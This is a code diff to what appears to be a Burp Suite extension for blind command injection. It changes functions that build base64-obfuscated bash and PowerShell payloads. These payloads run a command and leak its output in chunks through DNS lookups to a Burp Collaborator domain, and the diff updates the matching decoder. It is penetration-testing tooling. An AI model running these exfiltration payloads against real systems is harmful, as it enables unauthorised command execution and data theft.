@@ -130,12 +130,12 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         return self.tab
 
     def createBashBase64Payload(self, linuxCommand):
-        bashCommand = '''i=0;''' + linuxCommand + '''|base64 -w60|sed -r 's/$/E-F/g;s/=/-/g;s/\\+/_/g'|while read j;do host `printf '%04d' $i`.$j.''' + self.collaboratorDomain + '''&((i++));done'''
-        return "echo " + self._helpers.base64Encode(bashCommand) + "|base64 -d|sh"
+       bashCommand = '''''' + linuxCommand + '''|base64 -w60|tr '+' '-'|while read j;do host `printf '%04d' $i`.${j//=/E-F}.''' + self.collaboratorDomain + '''&((i++));done'''
+       return "base64 -d<<<" + self._helpers.base64Encode(bashCommand) + "|sh"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
-        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$b+="E-F";$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","-").replace("+","_");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","E-F").replace("+","-");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
     
     # return generated payload to payload text area
@@ -222,7 +222,7 @@ def showOutput(outputDict):
           int(k)  # skip if failed
           completedInputString += v
       except: continue
-    output = completedInputString.replace('E-F','').replace('-','=').replace('_','+') # drop EOF marker and replace any - padding with = and fix _s
+    output = completedInputString.replace('E-F','=').replace('-','+') # replace E-F with = and - with +
     try:
       output = base64.b64decode(output)
     except:
